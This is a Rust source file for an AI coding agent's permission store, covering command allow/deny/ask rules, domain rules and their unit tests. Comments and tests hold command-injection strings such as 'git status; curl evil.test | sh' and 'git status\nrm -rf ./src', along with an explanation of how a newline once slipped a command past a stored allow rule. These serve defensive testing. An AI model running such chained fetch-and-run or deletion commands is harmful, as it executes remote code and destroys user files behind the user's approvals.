use agiworkforce_protocol::code_domain::{
    AdminPolicyCap, CodeCapabilities, CodeCapability, CodePermissionProfile, PermissionDecision,
    PermissionProfileId,
};
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::{LazyLock, Mutex};

use crate::cli_options::PermissionMode;

// AUDIT-FIX: C-2, token-prefix match prevents `git status; curl evil|sh` slipping past a `git status` allow.
fn token_prefix_matches(entry: &str, candidate_tokens: &[&str]) -> bool {
    let entry_tokens: Vec<&str> = entry.split_whitespace().collect();
    if entry_tokens.is_empty() || candidate_tokens.len() < entry_tokens.len() {
        return false;
    }
    for (i, etok) in entry_tokens.iter().enumerate() {
        if candidate_tokens[i] != *etok {
            return false;
        }
    }
    for tok in &candidate_tokens[entry_tokens.len()..] {
        if contains_shell_metachar(tok) {
            return false;
        }
    }
    true
}

fn contains_shell_metachar(tok: &str) -> bool {
    let bad_single = [';', '&', '|', '>', '<', '`', '\n', '\r'];
    if tok.chars().any(|c| bad_single.contains(&c)) {
        return true;
    }
    tok.contains("$(") || tok.contains("&&") || tok.contains("||")
}

fn command_contains_shell_metachar(command: &str) -> bool {
    command.contains('\n')
        || command.contains('\r')
        || command.split_whitespace().any(contains_shell_metachar)
}

fn normalize_rule(prefix: &str) -> Option<String> {
    let normalized = prefix.split_whitespace().collect::<Vec<_>>().join(" ");
    if normalized.is_empty() {
        None
    } else {
        Some(normalized)
    }
}

pub const DOMAIN_RULE_PREFIX: &str = "domain:";

const OPEN_ENDED_PROGRAMS: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "fish",
    "pwsh",
    "powershell",
    "env",
    "sudo",
    "xargs",
    "python",
    "python3",
    "node",
    "npx",
    "npm exec",
    "pnpm dlx",
    "bun",
    "bunx",
    "bun x",
    "bun run",
    "uv run",
    "deno",
    "deno run",
    "deno eval",
    "ruby",
    "perl",
    "php",
    "bash -c",
    "sh -c",
    "zsh -c",
    "fish -c",
    "pwsh -c",
    "pwsh -command",
    "powershell -c",
    "powershell -command",
    "python -c",
    "python -m",
    "python3 -c",
    "python3 -m",
    "node -e",
    "node -p",
    "node --eval",
    "ruby -e",
    "perl -e",
    "php -r",
];

pub fn open_ended_allow_error(rule: &str) -> Option<String> {
    let mut tokens: Vec<&str> = rule.split_whitespace().collect();
    let program = tokens.first().copied()?;
    let base = Path::new(program)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(program);
    tokens[0] = base;
    let named = tokens.join(" ");
    OPEN_ENDED_PROGRAMS
        .contains(&named.to_ascii_lowercase().as_str())
        .then(|| {
            format!(
                "An allow rule for `{named}` alone would run any script or command without \
                 asking. Name the full command instead."
            )
        })
}

fn normalize_domain(text: &str) -> String {
    text.trim().trim_end_matches('.').to_ascii_lowercase()
}

fn labels_match(pattern: &[&str], host: &[&str]) -> bool {
    pattern.len() == host.len()
        && pattern
            .iter()
            .zip(host)
            .all(|(pattern, label)| *pattern == "*" || pattern == label)
}

pub fn domain_pattern_matches(pattern: &str, host: &str) -> bool {
    let pattern = normalize_domain(pattern);
    let host = normalize_domain(host);
    if pattern.is_empty() || host.is_empty() {
        return false;
    }
    if pattern == "*" {
        return true;
    }
    let host_labels: Vec<&str> = host.split('.').collect();
    match pattern.strip_prefix("*.") {
        Some(suffix) => {
            let suffix_labels: Vec<&str> = suffix.split('.').collect();
            host_labels.len() > suffix_labels.len()
                && labels_match(
                    &suffix_labels,
                    &host_labels[host_labels.len() - suffix_labels.len()..],
                )
        }
        None => labels_match(&pattern.split('.').collect::<Vec<_>>(), &host_labels),
    }
}

pub fn website_allow_error(pattern: &str) -> Option<String> {
    let pattern = normalize_domain(pattern);
    let host = pattern.strip_prefix("*.").unwrap_or(&pattern);
    let literal = host.trim_matches(|c| c == '[' || c == ']');
    if host.is_empty() || host.contains('*') {
        return Some(
            "A site allow rule names a host such as example.com or *.example.com".to_string(),
        );
    }
    if literal.parse::<std::net::IpAddr>().is_ok()
        || host.parse::<u32>().is_ok()
        || crate::safety::network_target::is_internal_host(host)
        || host == "metadata.google"
    {
        return Some(format!(
            "{host} is an address on this computer, its private network or a cloud metadata \
             service, so it cannot be allowed ahead of time. Approve each fetch when asked."
        ));
    }
    None
}

pub fn url_blocked_by_domain_rule(url: &str) -> Option<String> {
    let host = reqwest::Url::parse(url).ok()?.host_str()?.to_string();
    let store = PermissionStore::load().ok()?;
    let rule = store.denying_domain_rule(&host)?;
    Some(format!(
        "{host} is blocked by your rule {rule}, so the agent cannot open or fetch it. /permissions remove deny {rule} lifts it."
    ))
}

static PROCESS_SESSION_ALLOW: LazyLock<Mutex<HashSet<String>>> =
    LazyLock::new(|| Mutex::new(HashSet::new()));

fn process_session_allow_snapshot() -> HashSet<String> {
    PROCESS_SESSION_ALLOW
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
        .clone()
}

/// A rule entry for per-invocation or workspace-scoped permissions.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PermissionRule {
    /// Tool or command prefix this rule applies to.
    pub pattern: String,
    /// Optional human-readable note attached when the rule was created.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
}

impl PermissionRule {
    pub fn new(pattern: impl Into<String>) -> Self {
        Self {
            pattern: pattern.into(),
            note: None,
        }
    }
}

/// File-mutating operation names stored as exact, scoped permission keys.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FilePermissionOperation {
    Write,
    Edit,
    MultiEdit,
    Patch,
}

impl FilePermissionOperation {
    fn as_str(self) -> &'static str {
        match self {
            Self::Write => "write",
            Self::Edit => "edit",
            Self::MultiEdit => "multiedit",
            Self::Patch => "patch",
        }
    }
}

fn file_permission_key(operation: FilePermissionOperation, path: &Path) -> Option<String> {
    let normalized = if path.exists() {
        path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
    } else if let (Some(parent), Some(name)) = (path.parent(), path.file_name()) {
        parent
            .canonicalize()
            .map(|parent| parent.join(name))
            .unwrap_or_else(|_| path.to_path_buf())
    } else {
        path.to_path_buf()
    };
    let display = normalized.to_string_lossy();
    if display.trim().is_empty() {
        None
    } else {
        Some(format!("file:{}:{}", operation.as_str(), display))
    }
}

/// Persistent permission store for command approvals.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PermissionStore {
    /// Commands/prefixes that are always allowed (user said "always allow").
    #[serde(default)]
    pub always_allow: HashSet<String>,

    /// Commands/prefixes that are always denied.
    #[serde(default)]
    pub always_deny: HashSet<String>,

    /// Session-scoped approvals (not persisted, but tracked in memory).
    #[serde(skip)]
    pub session_allow: HashSet<String>,

    /// Tools that require per-invocation approval each time they run (Ask mode).
    /// Persisted so the preference survives across sessions.
    #[serde(default)]
    pub ask_list: Vec<PermissionRule>,

    /// Workspace-scoped rules: apply only within the current project directory.
    #[serde(default)]
    pub workspace_rules: Vec<PermissionRule>,

    /// The permission mode this session is running under, which names the
    /// profile the stored rules sit inside. Session-only: the mode belongs to
    /// the invocation, not to the machine.
    #[serde(skip)]
    pub active_mode: Option<PermissionMode>,
}

/// The capability a stored command rule decides, for the capabilities a rule
/// can name. Hook bypass is absent on purpose: `--no-verify` is a flag on
/// another command, not a command prefix a user can allow.
const CAPABILITY_COMMANDS: &[(CodeCapability, &str)] = &[
    (CodeCapability::GitCommit, "git commit"),
    (CodeCapability::GitPush, "git push"),
    (CodeCapability::GitHistoryRewrite, "git rebase"),
];

/// The canonical profile a permission mode names.
pub fn permission_profile_for(mode: Option<PermissionMode>) -> CodePermissionProfile {
    match mode.unwrap_or_default() {
        PermissionMode::Default => CodePermissionProfile::standard(),
        PermissionMode::Plan => {
            let mut profile = CodePermissionProfile::read_only();
            profile.id = PermissionProfileId::new("plan");
            profile.name = "Plan".to_string();
            profile
        }
        PermissionMode::AcceptEdits => {
            let mut profile = CodePermissionProfile::standard();
            profile.id = PermissionProfileId::new("accept-edits");
            profile.name = "Accept edits".to_string();
            profile.capabilities.file_write = PermissionDecision::Allow;
            profile
        }
        PermissionMode::BypassPermissions => {
            let mut profile = CodePermissionProfile::full_access();
            profile.id = PermissionProfileId::new("bypass-permissions");
            profile.name = "Bypass permissions".to_string();
            profile.capabilities = CodeCapabilities::uniform(PermissionDecision::Allow);
            profile
        }
        PermissionMode::DontAsk => {
            let mut profile = CodePermissionProfile::standard();
            profile.id = PermissionProfileId::new("dont-ask");
            profile.name = "Headless".to_string();
            for capability in CodeCapability::ALL {
                if profile.capabilities.get(*capability) == PermissionDecision::Ask {
                    profile
                        .capabilities
                        .set(*capability, PermissionDecision::Deny);
                }
            }
            profile
        }
    }
}

pub fn permission_profile_id(mode: Option<PermissionMode>) -> PermissionProfileId {
    permission_profile_for(mode).id
}

fn persisted_active_mode() -> Option<PermissionMode> {
    crate::config::CliConfig::load()
        .ok()?
        .default
        .permission_mode
        .as_deref()
        .and_then(crate::cli_options::persisted_permission_mode)
        .map(|mode| mode.within(managed_permission_mode()))
}

pub(crate) fn managed_permission_mode() -> Option<PermissionMode> {
    use crate::platform::policy::managed::{load_managed_policy, ManagedPolicyState};
    match load_managed_policy() {
        ManagedPolicyState::Absent => None,
        ManagedPolicyState::Invalid(_) => Some(PermissionMode::Default),
        ManagedPolicyState::Loaded { document, .. } => document
            .config
            .and_then(|config| config.permission_mode)
            .map(|raw| {
                crate::cli_options::persisted_permission_mode(&raw)
                    .unwrap_or(PermissionMode::Default)
            }),
    }
}

impl PermissionStore {
    fn path() -> Result<PathBuf> {
        Ok(crate::config::CliConfig::config_dir()?.join("permissions.toml"))
    }

    pub fn load() -> Result<Self> {
        let path = Self::path()?;
        let mut store = if path.exists() {
            let contents =
                std::fs::read_to_string(&path).context("Failed to read permissions.toml")?;
            toml::from_str(&contents).context("Failed to parse permissions.toml")?
        } else {
            Self::default()
        };
        store.session_allow = process_session_allow_snapshot();
        store.active_mode = persisted_active_mode();
        Ok(store)
    }

    pub fn save(&self) -> Result<()> {
        let dir = crate::config::CliConfig::config_dir()?;
        std::fs::create_dir_all(&dir)?;
        let path = Self::path()?;
        let contents = toml::to_string_pretty(self).context("Failed to serialize permissions")?;
        std::fs::write(&path, &contents).context("Failed to write permissions.toml")?;
        // Restrict file permissions to owner-only (contains allow/deny lists)
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
        }
        Ok(())
    }

    /// Check if a command is permitted (by token-prefix match against allow/deny lists).
    /// Returns Some(true) if allowed, Some(false) if denied, None if no match.
    #[allow(dead_code)]
    pub fn check(&self, command: &str) -> Option<bool> {
        // `split_whitespace` eats newlines, so `git status\nrm -rf ./src`
        // tokenized to [git, status, rm, -rf, ./src] and prefix-matched a
        // stored `git status` rule with no metachar in any trailing token.
        // the prompt was skipped and sh -c ran both lines. A stored rule can
        // never span lines, so a multi-line command has no stored decision.
        if command.contains('\n') || command.contains('\r') {
            return None;
        }
        let trimmed = command.trim();
        let candidate_tokens: Vec<&str> = trimmed.split_whitespace().collect(); // AUDIT-FIX: C-2

        for denied in &self.always_deny {
            if token_prefix_matches(denied, &candidate_tokens) {
                return Some(false);
            }
        }

        for allowed in self.always_allow.iter().chain(self.session_allow.iter()) {
            if open_ended_allow_error(allowed).is_some() {
                continue;
            }
            if token_prefix_matches(allowed, &candidate_tokens) {
                return Some(true);
            }
        }

        None
    }

    pub fn check_command(&self, command: &str) -> Option<bool> {
        let command_program = command.split_whitespace().next().unwrap_or(command);
        let base_cmd = std::path::Path::new(command_program)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(command_program);
        self.check_command_with_program_fallbacks(command, command_program, base_cmd)
    }

    pub fn check_command_with_program_fallbacks(
        &self,
        command: &str,
        command_program: &str,
        base_cmd: &str,
    ) -> Option<bool> {
        if let Some(decision) = self.check(command) {
            return Some(decision);
        }

        if command_contains_shell_metachar(command) {
            return None;
        }

        if let Some(decision) = self.check(command_program) {
            return Some(decision);
        }
        match self.check(base_cmd) {
            Some(true) if base_cmd != command_program => None,
            decision => decision,
        }
    }

    /// Like [`PermissionStore::check_command`], except that an allow saved for
    /// a command does not carry over to the same command with the repository's
    /// hooks turned off. A stored `git commit` prefix-matches
    /// `git commit --no-verify`, and the two are not the same decision, so the
    /// bypass has to be named by the rule that allows it.
    pub fn check_command_allowing_hook_bypass(&self, command: &str) -> Option<bool> {
        let decision = self.check_command(command);
        if decision != Some(true) || !crate::safety::bypasses_git_hooks(command) {
            return decision;
        }
        let tokens: Vec<&str> = command.split_whitespace().collect();
        let named = self
            .always_allow
            .iter()
            .chain(self.session_allow.iter())
            .any(|rule| {
                crate::safety::bypasses_git_hooks(rule) && token_prefix_matches(rule, &tokens)
            });
        named.then_some(true)
    }

    fn stored_decision(&self, command: &str) -> Option<PermissionDecision> {
        match self.check_command(command) {
            Some(true) => Some(PermissionDecision::Allow),
            Some(false) => Some(PermissionDecision::Deny),
            None => self.asks_before(command).then_some(PermissionDecision::Ask),
        }
    }

    /// The canonical permission profile this session runs under: the profile
    /// its mode names, narrowed by the rules the user actually stored, then by
    /// admin policy.
    pub fn code_permission_profile(
        &self,
        admin_cap: Option<AdminPolicyCap>,
    ) -> CodePermissionProfile {
        let mut profile = permission_profile_for(self.active_mode);
        for (capability, command) in CAPABILITY_COMMANDS {
            if let Some(decision) = self.stored_decision(command) {
                profile.capabilities.set(*capability, decision);
            }
        }
        match admin_cap {
            Some(cap) => profile.under_admin_cap(cap),
            None => profile,
        }
    }

    pub fn denying_domain_rule(&self, host: &str) -> Option<&str> {
        self.always_deny
            .iter()
            .find(|rule| {
                rule.strip_prefix(DOMAIN_RULE_PREFIX)
                    .is_some_and(|pattern| domain_pattern_matches(pattern, host))
            })
            .map(String::as_str)
    }

    pub fn names_domain(&self, host: &str) -> bool {
        let host = normalize_domain(host);
        self.always_allow
            .iter()
            .chain(self.session_allow.iter())
            .filter_map(|rule| rule.strip_prefix(DOMAIN_RULE_PREFIX))
            .filter(|pattern| website_allow_error(pattern).is_none())
            .any(|pattern| domain_pattern_matches(pattern, &host))
    }

    /// Check a path-scoped file mutation rule. File rules use exact keys so
    /// paths containing spaces are not interpreted as command tokens.
    pub fn check_file(&self, operation: FilePermissionOperation, path: &Path) -> Option<bool> {
        let key = file_permission_key(operation, path)?;
        if self.always_deny.contains(&key) {
            return Some(false);
        }
        if self.always_allow.contains(&key) || self.session_allow.contains(&key) {
            return Some(true);
        }
        None
    }

    /// Check a multi-file operation. Every target must be allowed; any deny
    /// wins; an empty target list has no saved permission match.
    pub fn check_files(
        &self,
        operation: FilePermissionOperation,
        paths: &[PathBuf],
    ) -> Option<bool> {
        if paths.is_empty() {
            return None;
        }

        let mut all_allowed = true;
        for path in paths {
            match self.check_file(operation, path) {
                Some(false) => return Some(false),
                Some(true) => {}
                None => all_allowed = false,
            }
        }
        all_allowed.then_some(true)
    }

    /// Add a command prefix to the "always allow" persistent list.
    #[allow(dead_code)]
    pub fn allow_always(&mut self, prefix: &str) {
        if let Some(rule) = normalize_rule(prefix) {
            self.always_allow.insert(rule);
        }
    }

    /// Add a command prefix to the session allow list.
    #[allow(dead_code)]
    pub fn allow_session(&mut self, prefix: &str) {
        if let Some(rule) = normalize_rule(prefix) {
            self.session_allow.insert(rule);
        }
    }

    /// Add a command prefix to the process-wide session allow list.
    pub fn allow_session_for_process(&mut self, prefix: &str) {
        if let Some(rule) = normalize_rule(prefix) {
            self.session_allow.insert(rule.clone());
            PROCESS_SESSION_ALLOW
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner())
                .insert(rule);
        }
    }

    pub fn allow_file_always(&mut self, operation: FilePermissionOperation, path: &Path) {
        if let Some(rule) = file_permission_key(operation, path) {
            self.always_allow.insert(rule);
        }
    }

    pub fn allow_file_session_for_process(
        &mut self,
        operation: FilePermissionOperation,
        path: &Path,
    ) {
        if let Some(rule) = file_permission_key(operation, path) {
            self.session_allow.insert(rule.clone());
            PROCESS_SESSION_ALLOW
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner())
                .insert(rule);
        }
    }

    /// Add a command prefix to the "always deny" persistent list.
    #[allow(dead_code)]
    pub fn deny_always(&mut self, prefix: &str) {
        if let Some(rule) = normalize_rule(prefix) {
            self.always_deny.insert(rule);
        }
    }

    pub fn remove_always_allow(&mut self, prefix: &str) -> bool {
        normalize_rule(prefix)
            .map(|rule| self.always_allow.remove(&rule))
            .unwrap_or(false)
    }

    pub fn remove_always_deny(&mut self, prefix: &str) -> bool {
        normalize_rule(prefix)
            .map(|rule| self.always_deny.remove(&rule))
            .unwrap_or(false)
    }

    pub fn remove_session(&mut self, prefix: &str) -> bool {
        let Some(rule) = normalize_rule(prefix) else {
            return false;
        };
        let removed_local = self.session_allow.remove(&rule);
        let removed_process = PROCESS_SESSION_ALLOW
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .remove(&rule);
        removed_local || removed_process
    }

    pub fn ask_always(&mut self, prefix: &str) {
        let Some(rule) = normalize_rule(prefix).map(PermissionRule::new) else {
            return;
        };
        if !self.ask_list.contains(&rule) {
            self.ask_list.push(rule);
        }
    }

    pub fn remove_ask(&mut self, prefix: &str) -> bool {
        let Some(rule) = normalize_rule(prefix) else {
            return false;
        };
        let before = self.ask_list.len();
        self.ask_list.retain(|existing| existing.pattern != rule);
        self.ask_list.len() != before
    }

    pub fn asks_before(&self, command: &str) -> bool {
        command
            .split(['\n', '\r', ';', '&', '|', '(', ')', '`'])
            .any(|segment| {
                let mut tokens: Vec<&str> = segment.split_whitespace().collect();
                if let Some(program) = tokens.first_mut() {
                    *program = Path::new(*program)
                        .file_name()
                        .and_then(|name| name.to_str())
                        .unwrap_or(program);
                }
                self.ask_list.iter().any(|rule| {
                    let rule_tokens: Vec<&str> = rule.pattern.split_whitespace().collect();
                    !rule_tokens.is_empty() && tokens.starts_with(&rule_tokens)
                })
            })
    }

    /// Add a rule scoped to the current workspace.
    #[allow(dead_code)]
    pub fn allow_workspace(&mut self, pattern: &str) {
        let rule = PermissionRule::new(pattern);
        if !self.workspace_rules.contains(&rule) {
            self.workspace_rules.push(rule);
        }
    }

    /// Reset all permissions.
    pub fn reset(&mut self) {
        self.always_allow.clear();
        self.always_deny.clear();
        self.session_allow.clear();
        self.ask_list.clear();
        self.workspace_rules.clear();
        PROCESS_SESSION_ALLOW
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .clear();
    }

    pub fn display_tab(
        &self,
        tab: &str,
        recent_denials: &[String],
        directories: &[PathBuf],
    ) -> String {
        let tabs = [
            ("recently-denied", "Recently denied"),
            ("allow", "Allow"),
            ("ask", "Ask"),
            ("deny", "Deny"),
            ("session", "Session"),
            ("workspace", "Workspace"),
        ];
        let active = match tab.to_lowercase().as_str() {
            "deny" | "always-deny" => "deny",
            "ask" => "ask",
            "session" => "session",
            "workspace" | "directories" => "workspace",
            "recently-denied" | "recent" => "recently-denied",
            _ => "allow",
        };
        let header = tabs
            .iter()
            .map(|(id, label)| {
                if *id == active {
                    format!("[{label}]")
                } else {
                    label.to_string()
                }
            })
            .collect::<Vec<_>>()
            .join("  ");
        let sorted = |rules: Vec<String>| {
            let mut rules = rules;
            rules.sort();
            rules
        };
        let (hint, entries) = match active {
            "deny" => (
                "AGI will never use denied tools.",
                sorted(self.always_deny.iter().cloned().collect()),
            ),
            "ask" => (
                "AGI asks before every command that starts with one of these, even when an \
                 allow rule covers it.",
                sorted(
                    self.ask_list
                        .iter()
                        .map(|rule| rule.pattern.clone())
                        .collect(),
                ),
            ),
            "session" => (
                "Allowed until AGI exits. Nothing here is saved.",
                sorted(self.session_allow.iter().cloned().collect()),
            ),
            "workspace" => (
                "Directories the agent may read and change. Add one with /add-dir, remove one \
                 with /remove-dir.",
                directories
                    .iter()
                    .map(|directory| directory.display().to_string())
                    .collect(),
            ),
            "recently-denied" => (
                "Tool calls that were denied, newest first.",
                recent_denials.to_vec(),
            ),
            _ => (
                "AGI won't ask before using allowed tools.",
                sorted(self.always_allow.iter().cloned().collect()),
            ),
        };

        let mut out = format!("Permissions:  {header}\n\n");
        out.push_str(&format!(
            "  Active profile: {}\n",
            self.code_permission_profile(None).display_label()
        ));
        out.push_str(&format!("  {hint}\n\n"));
        for (index, entry) in entries.iter().enumerate() {
            out.push_str(&format!("   {:>2}.  {entry}\n", index + 1));
        }
        if entries.is_empty() {
            out.push_str("        (none)\n");
        }
        out.push_str(
            "\n  /permissions <tab> shows a tab. /permissions allow|ask|deny|session <rule> adds a \
             rule, and /permissions remove <scope> <rule> removes one.\n",
        );
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_newline_cannot_ride_a_stored_allow() {
        let mut store = PermissionStore::default();
        store.allow_always("git status");

        assert_eq!(store.check("git status"), Some(true));
        // The payload the old tokenizer flattened into [git, status, rm, -rf, ./src].
        assert_eq!(store.check("git status\nrm -rf ./src"), None);
        assert_eq!(store.check("git status\r\nrm -rf ./src"), None);
        assert_eq!(store.check("git status\rrm -rf ./src"), None);
    }

    #[test]
    fn a_newline_reads_as_a_metachar_in_the_raw_string_guard() {
        assert!(command_contains_shell_metachar("git status\nrm -rf ./src"));
        assert!(command_contains_shell_metachar("git status\rrm -rf ./src"));
        assert!(!command_contains_shell_metachar("git status --short"));
    }

    #[test]
    fn a_deny_rule_still_wins_over_an_allow_rule() {
        let mut store = PermissionStore::default();
        store.allow_always("git");
        store.always_deny.insert("git push".to_string());

        assert_eq!(store.check("git push origin main"), Some(false));
    }

    #[test]
    fn test_empty_store_returns_none() {
        let store = PermissionStore::default();
        assert_eq!(store.check("ls -la"), None);
    }

    #[test]
    fn test_allow_always() {
        let mut store = PermissionStore::default();
        store.allow_always("npm");
        assert_eq!(store.check("npm install express"), Some(true));
        assert_eq!(store.check("cargo build"), None);
    }

    #[test]
    fn test_deny_takes_precedence() {
        let mut store = PermissionStore::default();
        store.allow_always("npm");
        store.deny_always("npm install");
        assert_eq!(store.check("npm install malware"), Some(false));
        assert_eq!(store.check("npm test"), Some(true));
    }

    #[test]
    fn test_session_allow() {
        let mut store = PermissionStore::default();
        store.allow_session("cargo build");
        assert_eq!(store.check("cargo build --release"), Some(true));
        assert_eq!(store.check("cargo test"), None);
    }

    #[test]
    fn test_file_permission_rules_are_exact_and_operation_scoped() {
        let mut store = PermissionStore::default();
        let path = PathBuf::from("/workspace/src/main.rs");

        store.allow_file_always(FilePermissionOperation::Write, &path);

        assert_eq!(
            store.check_file(FilePermissionOperation::Write, &path),
            Some(true)
        );
        assert_eq!(store.check_file(FilePermissionOperation::Edit, &path), None);
        assert_eq!(
            store.check_file(
                FilePermissionOperation::Write,
                &PathBuf::from("/workspace/src/main.rs.bak")
            ),
            None
        );
    }

    #[test]
    fn a_later_file_denial_wins_over_an_earlier_unmatched_target() {
        let mut store = PermissionStore::default();
        let first = PathBuf::from("/workspace/new.rs");
        let denied = PathBuf::from("/workspace/.vscode/tasks.json");
        store
            .always_deny
            .insert(file_permission_key(FilePermissionOperation::Patch, &denied).unwrap());
        assert_eq!(
            store.check_files(FilePermissionOperation::Patch, &[first, denied]),
            Some(false)
        );
    }

    #[test]
    fn test_file_permission_paths_with_spaces_are_exact() {
        let mut store = PermissionStore::default();
        let path = PathBuf::from("/workspace/path with spaces/file.rs");

        store.allow_file_always(FilePermissionOperation::MultiEdit, &path);

        assert_eq!(
            store.check_file(FilePermissionOperation::MultiEdit, &path),
            Some(true)
        );
        assert_eq!(
            store.check_file(
                FilePermissionOperation::MultiEdit,
                &PathBuf::from("/workspace/path with spaces/file.rs.extra")
            ),
            None
        );
    }

    #[test]
    fn test_reset() {
        let mut store = PermissionStore::default();
        store.allow_always("npm");
        store.deny_always("rm");
        store.allow_session("cargo");
        store.reset();
        assert_eq!(store.check("npm test"), None);
        assert_eq!(store.check("rm file"), None);
        assert_eq!(store.check("cargo build"), None);
    }

    #[test]
    fn test_display_empty() {
        let store = PermissionStore::default();
        let display = store.display_tab("allow", &[], &[]);
        // Tabbed header is always present
        assert!(display.contains("Permissions:"));
        assert!(display.contains("[Allow]"));
        // No rules means the empty-state marker
        assert!(display.contains("(none)"));
    }

    #[test]
    fn test_display_with_entries() {
        let mut store = PermissionStore::default();
        store.allow_always("npm test");
        let display = store.display_tab("allow", &[], &[]);
        assert!(display.contains("Permissions:"));
        assert!(display.contains("  1.  npm test"), "{display}");
        assert!(!display.contains("Add a new rule"), "{display}");
        assert!(!display.contains("Search"), "{display}");
    }

    #[test]
    fn test_display_tab_deny() {
        let mut store = PermissionStore::default();
        store.deny_always("rm -rf");
        let display = store.display_tab("deny", &[], &[]);
        assert!(display.contains("[Deny]"));
        assert!(display.contains("rm -rf"));
        assert!(display.contains("AGI will never use denied tools."));
    }

    #[test]
    fn test_display_tab_ask() {
        let mut store = PermissionStore::default();
        store.ask_always("cargo test");
        let display = store.display_tab("ask", &[], &[]);
        assert!(display.contains("[Ask]"));
        assert!(display.contains("cargo test"));
    }

    #[test]
    fn the_session_tab_lists_session_allows_and_not_ask_rules() {
        let mut store = PermissionStore::default();
        store.allow_session("npm test");
        store.ask_always("git push");

        let display = store.display_tab("session", &[], &[]);

        assert!(display.contains("[Session]"), "{display}");
        assert!(display.contains("npm test"), "{display}");
        assert!(!display.contains("git push"), "{display}");
    }

    #[test]
    fn an_ask_rule_covers_every_segment_and_path_spelling_of_its_command() {
        let mut store = PermissionStore::default();
        store.ask_always("git   push");

        for command in [
            "git push origin main",
            "cd app && git push",
            "cargo test; git push --force",
            "echo $(git push)",
            "/usr/bin/git push",
        ] {
            assert!(store.asks_before(command), "{command}");
        }
        for command in ["git status", "git pushx", "echo git push"] {
            assert!(!store.asks_before(command), "{command}");
        }
        assert!(store.remove_ask("git push"));
        assert!(!store.asks_before("git push"));
        assert!(!store.remove_ask("git push"));
    }

    #[test]
    fn test_display_tab_unknown_falls_back_to_allow() {
        let store = PermissionStore::default();
        let display = store.display_tab("bogus", &[], &[]);
        assert!(display.contains("[Allow]"));
    }

    #[test]
    fn test_display_tab_rules_sorted() {
        let mut store = PermissionStore::default();
        store.allow_always("zzz");
        store.allow_always("aaa");
        store.allow_always("mmm");
        let display = store.display_tab("allow", &[], &[]);
        let aaa_pos = display.find("aaa").unwrap();
        let mmm_pos = display.find("mmm").unwrap();
        let zzz_pos = display.find("zzz").unwrap();
        assert!(
            aaa_pos < mmm_pos && mmm_pos < zzz_pos,
            "rules should be sorted"
        );
    }

    #[test]
    fn test_display_tab_footer() {
        let store = PermissionStore::default();
        let display = store.display_tab("allow", &[], &[]);
        assert!(
            display.contains("/permissions remove <scope> <rule>"),
            "{display}"
        );
        assert!(!display.contains("tab switch"), "{display}");
        assert!(!display.contains("Esc cancel"), "{display}");
    }

    #[test]
    fn full_command_rules_match_before_program_fallbacks() {
        let mut store = PermissionStore::default();
        store.allow_always("git status");
        store.deny_always("git status --short");

        assert_eq!(store.check("git status"), Some(true));
        assert_eq!(store.check("git status --porcelain"), Some(true));
        assert_eq!(store.check("git status --short"), Some(false));
        assert_eq!(store.check("git"), None);
    }

    #[test]
    fn command_prefix_rules_reject_shell_metachar_suffixes() {
        let mut store = PermissionStore::default();
        store.allow_always("git status");

        assert_eq!(store.check("git status --short"), Some(true));
        assert_eq!(store.check("git status; curl evil.test | sh"), None);
        assert_eq!(store.check("git status && curl evil.test"), None);
    }

    #[test]
    fn command_fallbacks_do_not_bypass_shell_metachar_rejection() {
        let mut store = PermissionStore::default();
        store.allow_always("git");

        assert_eq!(store.check_command("git status"), Some(true));
        assert_eq!(store.check_command("git status && curl evil.test"), None);
        assert_eq!(
            store.check_command("/usr/bin/git status; curl evil.test"),
            None
        );
    }

    #[test]
    fn a_bare_allow_does_not_cover_a_program_given_by_path() {
        let mut store = PermissionStore::default();
        store.allow_always("git");

        assert_eq!(store.check_command("git status"), Some(true));
        for command in [
            "./git status",
            "/tmp/evil/git status",
            "/usr/bin/git status",
        ] {
            assert_eq!(store.check_command(command), None, "{command}");
        }

        store.allow_always("/usr/bin/git");
        assert_eq!(store.check_command("/usr/bin/git status"), Some(true));
    }

    #[test]
    fn a_bare_deny_still_covers_a_program_given_by_path() {
        let mut store = PermissionStore::default();
        store.deny_always("rm");

        assert_eq!(store.check_command("/bin/rm -rf build"), Some(false));
        assert_eq!(store.check_command("./rm -rf build"), Some(false));
    }

    #[test]
    fn permission_rules_are_normalized_when_inserted() {
        let mut store = PermissionStore::default();
        store.allow_always("  cargo    test  ");
        store.deny_always("\trm   -rf  ");
        store.allow_session("  npm   test  ");

        assert!(store.always_allow.contains("cargo test"));
        assert!(store.always_deny.contains("rm -rf"));
        assert!(store.session_allow.contains("npm test"));
    }

    #[test]
    fn remove_permission_rules_by_normalized_prefix() {
        let mut store = PermissionStore::default();
        store.allow_always("cargo test");
        store.deny_always("rm -rf");
        store.allow_session("npm test");

        assert!(store.remove_always_allow(" cargo   test "));
        assert!(store.remove_always_deny(" rm   -rf "));
        assert!(store.remove_session(" npm   test "));

        assert_eq!(store.check("cargo test"), None);
        assert_eq!(store.check("rm -rf target"), None);
        assert_eq!(store.check("npm test"), None);
    }

    #[test]
    fn test_display_tab_recently_denied() {
        let store = PermissionStore::default();
        let display = store.display_tab(
            "recently-denied",
            &["run_command: curl evil.test".to_string()],
            &[],
        );
        assert!(display.contains("[Recently denied]"));
        assert!(display.contains("run_command: curl evil.test"));
    }

    #[test]
    fn test_display_tab_workspace() {
        let store = PermissionStore::default();
        let display = store.display_tab(
            "workspace",
            &[],
            &[PathBuf::from("/work/app"), PathBuf::from("/work/shared")],
        );
        assert!(display.contains("[Workspace]"));
        assert!(display.contains("  1.  /work/app"), "{display}");
